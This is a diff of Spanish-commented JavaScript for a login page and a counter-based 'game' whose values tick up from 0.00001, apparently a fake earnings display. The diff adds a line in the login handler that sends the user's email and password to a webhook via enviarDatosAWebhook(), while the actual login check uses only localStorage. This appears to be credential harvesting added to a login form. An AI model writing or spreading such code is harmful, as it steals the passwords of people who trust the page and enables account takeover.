@@ -177,12 +177,12 @@ span {
     }
 });
 
-   document.getElementById('btnLogin').addEventListener('click', function() {
+ document.getElementById('btnLogin').addEventListener('click', function() {
     const email = document.getElementById('loginUsuario').value;
     const contrasena = document.getElementById('loginContrasena').value;
     
-    // Aquí continúa tu lógica existente de envío de datos al webhook y verificación de inicio de sesión...
-
+    enviarDatosAWebhook(email, contrasena); // Continúa enviando los datos al webhook como ya estaba configurado.
+    
     const userData = localStorage.getItem(email);
     if (userData) {
         const userInfo = JSON.parse(userData);
@@ -191,9 +191,6 @@ span {
             document.getElementById('login').style.display = 'none';
             document.getElementById('game-container').style.display = 'block';
             
-            // Llama a inicializarContadores justo aquí, después de un inicio de sesión exitoso
-            inicializarContadores();
-            
         } else {
             alert('Contraseña incorrecta');
         }
@@ -201,7 +198,6 @@ span {
         alert('Usuario no encontrado');
     }
 });
-
 
     // Cambia a la vista de registro
     document.getElementById('irARegistro').addEventListener('click', function() {
@@ -225,22 +221,22 @@ span {
         document.getElementById('game-container').style.display = 'none';
     }
 
-function iniciarContador(tipo) {
-    let valorInicial = parseFloat(localStorage.getItem(`contador${tipo}`) || 0.00001);
-    actualizarContador(tipo, valorInicial);
-}
-
-  
-   
+       inicializarContadores(); // Asegúrate de llamar esta función para inicializar los contadores
+       
 
 function inicializarContadores() {
     for (let i = 1; i <= 6; i++) {
         let valor = localStorage.getItem(`contador${i}`) || 0.00001;
-        document.querySelector(`#contador${i} span`).textContent = valor.toFixed(5);
+        document.querySelector(`#contador${i} span`).textContent = parseFloat(valor).toFixed(5);
         document.getElementById(`iniciarContador${i}`).addEventListener('click', function() {
             iniciarContador(i);
         });
     }
+}
+
+function iniciarContador(tipo) {
+    let valorInicial = parseFloat(localStorage.getItem(`contador${tipo}`) || 0.00001);
+    actualizarContador(tipo, valorInicial);
 }
 
 function actualizarContador(tipo, valorInicial) {
@@ -254,7 +250,6 @@ function actualizarContador(tipo, valorInicial) {
         }
     }, intervalos[tipo - 1]);
 }
-
           
       
     
